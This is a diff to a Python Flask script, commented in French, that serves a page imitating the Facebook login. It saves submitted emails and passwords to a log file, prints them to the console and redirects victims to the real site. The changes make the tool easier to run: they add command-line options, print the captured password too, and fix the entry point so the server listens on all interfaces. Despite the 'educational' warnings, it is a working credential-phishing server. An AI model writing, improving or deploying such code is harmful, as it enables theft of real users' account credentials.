@@ -21,9 +21,10 @@ L'auteur n'assume aucune responsabilité pour toute utilisation abusive de ce co
 from flask import Flask, request, render_template_string, redirect
 import os
 import datetime
-
-import socket
+import argparse
 import webbrowser
+import socket
+import sys
 
 # Template HTML représentant une page similaire à la page de connexion Facebook
 # Simplifié pour des raisons éducatives
@@ -186,27 +187,27 @@ def login():
             f.write(f"Password: {password}\n")
             f.write("-" * 50 + "\n")
         
-        print(f"[+] Identifiants capturés de {ip_address}: {email}")
+        print(f"[+] Identifiants capturés de {ip_address}: {email} / {password}")
+        sys.stdout.flush()
     
-    # Rediriger vers le vrai Facebook après la soumission
+    # Redirige vers le vrai Facebook après la soumission
     return redirect("https://www.facebook.com")
 
 def get_local_ip():
     """Obtient l'adresse IP locale de la machine"""
     try:
-        # Crée un socket pour déterminer l'IP locale
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))  # Se connecte à Google DNS
+        s.connect(("8.8.8.8", 80))
         ip = s.getsockname()[0]
         s.close()
         return ip
     except:
-        return "127.0.0.1"  # Retourne localhost en cas d'erreur
+        return "127.0.0.1"
 
 def main():
     """Fonction principale"""
     parser = argparse.ArgumentParser(description="Démonstration éducative de phishing Facebook")
-    parser.add_argument("--port", type=int, default=8080, help="Port du serveur web (défaut: 8080)")
+    parser.add_argument("--port", type=int, default=int(os.environ.get("PORT", 8080)), help="Port du serveur web")
     parser.add_argument("--no-browser", action="store_true", help="Ne pas ouvrir automatiquement le navigateur")
     
     args = parser.parse_args()
@@ -218,20 +219,22 @@ def main():
     print("! AVERTISSEMENT: DÉMONSTRATION ÉDUCATIVE DE PHISHING !".center(80))
     print("! NE PAS UTILISER POUR COLLECTER DE VRAIS IDENTIFIANTS !".center(80))
     print("!" * 80 + "\n")
+    sys.stdout.flush()
     
     print(f"[*] Démarrage du serveur de phishing éducatif...")
-    print(f"[*] Adresse locale  : http://{local_ip}:{port}")
+    print(f"[*] Adresse locale   : http://{local_ip}:{port}")
     print(f"[*] Adresse localhost: http://127.0.0.1:{port}")
     print(f"[*] Les identifiants capturés seront enregistrés dans: logs/captured_credentials.txt")
     print("[*] Appuyez sur CTRL+C pour arrêter le serveur\n")
+    sys.stdout.flush()
     
     if not args.no_browser:
         print("[*] Ouverture du navigateur...")
+        sys.stdout.flush()
         webbrowser.open(f"http://127.0.0.1:{port}")
     
-    # Démarre le serveur web Flask
-    app.run(host='0.0.0.0', port=port, debug=False)
+    # Démarre le serveur Flask
+    app.run(host="0.0.0.0", port=port, debug=False)
 
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port)
+    main()
